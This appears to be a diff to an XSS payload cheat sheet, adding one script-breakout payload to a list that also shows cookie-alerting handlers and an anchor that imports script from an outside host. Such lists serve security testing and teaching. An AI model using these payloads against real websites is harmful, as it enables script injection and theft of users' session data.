@@ -208,6 +208,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   %0d%0a</script><h1+onmouseover=alert(document.cookie)>mouseOver</h1>
   <a href=//X55.is autofocus onfocus=import(href)>%3Ca+href=//X55.is+autofocus+onfocus=import(href)%3E
   <a href=javascript:'\74svg/onload\75alert\501\51\76'>
+  -20a")});a=alert;a(1);//
   ```
 </details>
 
